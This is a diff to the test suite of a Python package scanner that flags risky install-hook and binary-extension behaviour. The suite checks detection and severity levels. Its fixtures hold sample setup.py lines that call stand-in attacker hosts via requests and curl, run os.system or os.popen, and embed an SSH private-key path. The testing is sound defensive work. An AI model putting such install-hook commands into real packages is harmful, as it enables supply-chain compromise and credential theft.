@@ -7,7 +7,7 @@ Critical security paths tested here (from eng review test plan):
   3. Network call in install hook → CRITICAL
   4. Credential path in install hook → HIGH
   5. Credential path in runtime file → MEDIUM (not HIGH)
-  6. subprocess shell=True in install hook → HIGH
+  6. subprocess shell execution in install hook → CRITICAL
   7. Sensitive env var access → MEDIUM
   8. Dynamic import → LOW
   9. Clean setup.py → no findings
@@ -121,6 +121,34 @@ class TestScanPythonFileCritical:
         findings = scan_python_file(str(setup), is_hook=True)
         assert any(f.level == RiskLevel.CRITICAL for f in findings)
 
+    def test_network_alias_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import requests as r\n"
+            "r.get('https://attacker.example/x')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_assigned_network_callable_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import requests\n"
+            "f = requests.get\n"
+            "f('https://attacker.example/x')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_getattr_os_system_in_install_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import os\n"
+            "getattr(os, 'system')('curl http://attacker')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
     def test_setup_py_fixture_is_critical(self):
         """The full malicious setup.py fixture is CRITICAL."""
         path = os.path.join(FIXTURES, "pth_attack", "setup.py")
@@ -147,31 +175,31 @@ class TestScanPythonFileHigh:
         findings = scan_python_file(str(setup), is_hook=True)
         assert any(f.level == RiskLevel.HIGH for f in findings)
 
-    def test_subprocess_shell_true_in_hook_is_high(self, tmp_path):
+    def test_subprocess_shell_true_in_hook_is_critical(self, tmp_path):
         setup = tmp_path / "setup.py"
         setup.write_text(
             "import subprocess\n"
             "subprocess.run(['ls'], shell=True)\n"
         )
         findings = scan_python_file(str(setup), is_hook=True)
-        assert any(f.level == RiskLevel.HIGH for f in findings)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
 
-    def test_os_system_in_hook_is_high(self, tmp_path):
-        """Regression: os.system() in setup.py must be HIGH (no shell=True kwarg)."""
+    def test_os_system_in_hook_is_critical(self, tmp_path):
+        """Regression: os.system() in setup.py must be CRITICAL."""
         setup = tmp_path / "setup.py"
         setup.write_text('import os\nos.system("curl http://attacker.com")\n')
         findings = scan_python_file(str(setup), is_hook=True)
-        assert any(f.level == RiskLevel.HIGH for f in findings), (
-            "os.system() in install hook must produce HIGH finding"
+        assert any(f.level == RiskLevel.CRITICAL for f in findings), (
+            "os.system() in install hook must produce CRITICAL finding"
         )
 
-    def test_os_popen_in_hook_is_high(self, tmp_path):
-        """Regression: os.popen() in setup.py must be HIGH."""
+    def test_os_popen_in_hook_is_critical(self, tmp_path):
+        """Regression: os.popen() in setup.py must be CRITICAL."""
         setup = tmp_path / "setup.py"
         setup.write_text('import os\nresult = os.popen("id").read()\n')
         findings = scan_python_file(str(setup), is_hook=True)
-        assert any(f.level == RiskLevel.HIGH for f in findings), (
-            "os.popen() in install hook must produce HIGH finding"
+        assert any(f.level == RiskLevel.CRITICAL for f in findings), (
+            "os.popen() in install hook must produce CRITICAL finding"
         )
 
     def test_os_system_in_runtime_is_not_high(self, tmp_path):
@@ -265,6 +293,21 @@ class TestScanPythonFileClean:
         mod.write_text("")
         assert scan_python_file(str(mod)) == []
 
+    def test_large_file_gets_confidence_warning_not_skipped(self, tmp_path):
+        mod = tmp_path / "large.py"
+        mod.write_text("a = 1\n" + ("# filler\n" * 250000))
+        findings = scan_python_file(str(mod), is_hook=False)
+        assert any("scan confidence reduced" in f.description for f in findings)
+
+    def test_large_hook_file_emits_high_confidence_warning(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text("a = 1\n" + ("# filler\n" * 250000))
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(
+            f.level == RiskLevel.HIGH and "scan confidence reduced" in f.description
+            for f in findings
+        )
+
 
 # ── is_install_hook_scope ────────────────────────────────────────────────────
 
@@ -344,3 +387,24 @@ class TestScanBinaryExtensions:
         findings = scan_binary_extensions(files, has_python_source=False)
         assert len(findings) == 1
         assert findings[0].level == RiskLevel.MEDIUM
+
+    def test_binary_ioc_ssh_path_escalates_high(self, tmp_path):
+        so_file = tmp_path / "_ioc.so"
+        so_file.write_bytes(b"\x7fELF.../.ssh/id_rsa...")
+        findings = scan_binary_extensions([str(so_file)], has_python_source=True)
+        assert any(f.level == RiskLevel.HIGH for f in findings)
+
+    def test_binary_ioc_network_marker_adds_medium(self, tmp_path):
+        so_file = tmp_path / "_ioc.so"
+        so_file.write_bytes(b"\x7fELF...https://evil.example...")
+        findings = scan_binary_extensions([str(so_file)], has_python_source=False)
+        assert any(f.level == RiskLevel.MEDIUM for f in findings)
+        assert any("HTTPS indicator" in f.description for f in findings)
+
+    def test_binary_ioc_scan_handles_missing_file(self):
+        findings = scan_binary_extensions(
+            ["/no/such/file.so"],
+            has_python_source=True,
+        )
+        # keeps base LOW blind-spot finding and ignores OSError for IOC read
+        assert any(f.level == RiskLevel.LOW for f in findings)
